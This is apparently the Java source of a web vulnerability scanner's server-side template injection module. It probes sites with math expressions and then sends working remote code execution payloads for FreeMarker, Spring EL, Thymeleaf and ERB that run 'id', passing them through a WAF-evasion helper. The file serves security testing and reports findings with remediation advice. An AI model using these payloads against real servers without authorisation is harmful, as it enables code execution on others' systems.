package gg.effront.anarcry.scanner.web.ssti;

import gg.effront.anarcry.model.CvssCalculator;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;
import gg.effront.anarcry.scanner.util.ProbeExecutor;
import gg.effront.anarcry.scanner.util.WafEvasion;

import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;

public class SstiModule implements Scanner {

    private static final List<String> PROBE_PATHS = List.of("/", "/search", "/api/search", "/api/", "/api/v1/",
            "/render", "/template", "/preview", "/page");

    private static final List<String> PARAMS = List.of("q", "query", "search", "name", "msg", "message", "text",
            "content", "template", "page", "input");

    private record SstiProbe(String payload, String engine) {
    }

    // Phase 1: math detection probes -- look for "2401" (7^4) in response.
    // 2401 has near-zero collision probability vs "49" which appears in
    // pagination/IDs/years.
    private static final List<SstiProbe> DETECTION_PROBES = List.of(new SstiProbe("${7*7*7*7}", "FreeMarker/Spring"),
            new SstiProbe("{{7*7*7*7}}", "Jinja2/Twig"), new SstiProbe("#{7*7*7*7}", "Thymeleaf"),
            new SstiProbe("${{7*7*7*7}}", "Thymeleaf/Spring"), new SstiProbe("<%= 7*7*7*7 %>", "ERB/EJS"),
            new SstiProbe("{{7*'7'}}", "Twig (confirma)"));

    // Phase 2: engine-specific RCE probes -- run after detection confirms an
    // engine.
    // Payloads attempt command output; look for uid= or root:x: in response.
    private record RceProbe(String enginePrefix, String payload, String description) {
    }

    private static final List<RceProbe> RCE_PROBES = List.of(
            // FreeMarker -- Execute?new() is the classic FreeMarker RCE gadget
            new RceProbe("FreeMarker", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                    "FreeMarker Execute?new() → executa 'id'"),
            // Spring EL via StreamUtils
            new RceProbe("Spring",
                    "${T(org.springframework.util.StreamUtils).copyToString("
                            + "T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream(),"
                            + "T(java.nio.charset.Charset).forName(\"UTF-8\"))}",
                    "Spring EL → Runtime.exec('id')"),
            // Jinja2 -- config global dump (safer than subprocess, confirms deeper access)
            new RceProbe("Jinja2", "{{config}}", "Jinja2 → config object dump"),
            // Twig -- _self.env access
            new RceProbe("Twig", "{{_self.env.getExtension(\"Twig\\\\Extension\\\\CoreExtension\")|json_encode}}",
                    "Twig → _self.env extension access"),
            // Thymeleaf expression preprocessing
            new RceProbe("Thymeleaf", "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x",
                    "Thymeleaf preprocessing → Runtime.exec"),
            // ERB
            new RceProbe("ERB", "<%= `id` %>", "ERB backtick → shell exec"));

    // Pattern that suggests real command output in response
    private static final java.util.regex.Pattern RCE_OUTPUT = java.util.regex.Pattern
            .compile("uid=\\d+|root:x:|www-data|nobody|\\[\"(Jinja2|Template|Config)");

    @Override
    public String id() {
        return "SSTI";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String _cweId = CweRegistry.cweId(id());
        String _cweTitle = CweRegistry.cweTitle(id());
        String _cveVector = CweRegistry.cvssVector(id());
        double _score = CvssCalculator.calculate(_cveVector);
        List<Finding> findings = new ArrayList<>();
        HttpClient hc = HttpClientFactory.http2();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String base = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        log.accept("[~] SSTI: injetando payloads matemáticos em " + base + " (" + PROBE_PATHS.size() + " paths x "
                + PARAMS.size() + " params x " + DETECTION_PROBES.size() + " engines)");

        int concurrency = ctx.config().probeConcurrency();
        AtomicBoolean cancel = new AtomicBoolean(false);
        List<Callable<List<Finding>>> tasks = new ArrayList<>();

        for (int pi = 0; pi < PROBE_PATHS.size(); pi++) {
            final String path = PROBE_PATHS.get(pi);
            final int pathIdx = pi;
            tasks.add(() -> {
                List<Finding> local = new ArrayList<>();
                log.accept("[~] SSTI: [" + (pathIdx + 1) + "/" + PROBE_PATHS.size() + "] " + path);
                for (String param : PARAMS) {
                    if (cancel.get()) {
                        return local;
                    }
                    String baseline = fetchBody(ctx, hc, base + path + "?" + param + "=test");
                    for (SstiProbe probe : DETECTION_PROBES) {
                        if (cancel.get()) {
                            return local;
                        }
                        String engine = tryMathProbe(ctx, hc, base, path, param, probe, baseline, log);
                        if (engine == null) {
                            continue;
                        }

                        String endpoint = path + "?" + param + "=" + URLEncoder.encode(probe.payload(), "UTF-8");
                        log.accept("[!!] SSTI: " + engine + " detectado em " + endpoint);

                        // Phase 2: try RCE probes for the matched engine
                        String rceEvidence = tryRceProbes(ctx, hc, base, path, param, engine, baseline, log);

                        if (rceEvidence != null) {
                            log.accept("[!!!] SSTI RCE: CONFIRMADO -- " + engine + " em " + endpoint);
                            local.add(Finding.of("SSTI", endpoint, "SSTI RCE CONFIRMADO -- " + engine,
                                    Severity.CRITICAL,
                                    "Engine: " + engine + " | RCE evidence: " + rceEvidence + " | URL: " + base
                                            + endpoint,
                                    "RCE confirmado via SSTI (" + engine
                                            + ") -- execução de código arbitrário no servidor",
                                    "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
                                            + probe.payload() + "'",
                                    "Nunca renderize input do usuário em templates; use sandbox isolado; "
                                            + "migrar para renderização de templates estáticos com variáveis seguras",
                                    _cweId, _cweTitle, _cveVector, _score));
                        } else {
                            local.add(Finding.of("SSTI", endpoint,
                                    "SSTI -- Template Injection detectado (" + engine + ")", Severity.CRITICAL,
                                    "Payload: " + probe.payload() + " -> resposta contém '2401' | Engine: " + engine
                                            + " | URL: " + base + endpoint,
                                    "Server-Side Template Injection -- equivale a RCE na engine " + engine
                                            + ". Payloads RCE conhecidos incluem: FreeMarker Execute?new(), "
                                            + "Spring T(Runtime).exec(), Jinja2 subclasses gadget",
                                    "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
                                            + probe.payload() + "'",
                                    "Nunca renderize input do usuário diretamente em templates. "
                                            + "Use sandboxing (Jinja2 SandboxedEnvironment) "
                                            + "ou variáveis com allowlist.",
                                    _cweId, _cweTitle, _cveVector, _score));
                        }
                        cancel.set(true);
                        return local;
                    }
                }
                return local;
            });
        }
        findings.addAll(ProbeExecutor.run(tasks, concurrency, cancel));

        if (findings.isEmpty()) {
            log.accept("[+] SSTI: nenhum template injection detectado");
        }
        return findings;
    }

    private String tryRceProbes(ScanContext ctx, HttpClient hc, String base, String path, String param,
            String detectedEngine, String baseline, Consumer<String> log) {
        for (RceProbe rce : RCE_PROBES) {
            // Only try probes compatible with the detected engine family
            if (!detectedEngine.toLowerCase().contains(rce.enginePrefix().toLowerCase())) {
                continue;
            }
            try {
                String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, rce.payload()), "UTF-8");
                String url = base + path + "?" + param + "=" + encoded;
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(6)).GET()
                        .build();
                HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
                String body = resp.body() != null ? resp.body() : "";
                var m = RCE_OUTPUT.matcher(body);
                if (resp.statusCode() == 200 && m.find() && !baseline.contains(m.group())) {
                    log.accept("[!!!] SSTI RCE: " + rce.description() + " → '" + m.group() + "'");
                    return rce.description() + " → output: " + m.group();
                }
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    private String tryMathProbe(ScanContext ctx, HttpClient hc, String base, String path, String param, SstiProbe probe,
            String baseline, Consumer<String> log) {
        try {
            String encoded = URLEncoder.encode(WafEvasion.evasionPayload(ctx, probe.payload()), "UTF-8");
            String url = base + path + "?" + param + "=" + encoded;
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(5)).GET()
                    .build();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            String body = resp.body() != null ? resp.body() : "";
            if (resp.statusCode() == 200) {
                if (body.contains("2401") && !baseline.contains("2401")) {
                    return probe.engine();
                }
                if (probe.payload().equals("{{7*'7'}}") && body.contains("7777777") && !baseline.contains("7777777")) {
                    return "Jinja2 (confirma)";
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private String fetchBody(ScanContext ctx, HttpClient hc, String url) {
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).timeout(Duration.ofSeconds(5)).GET()
                    .build();
            HttpResponse<String> r = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return r.body() != null ? r.body() : "";
        } catch (Exception e) {
            return "";
        }
    }
}
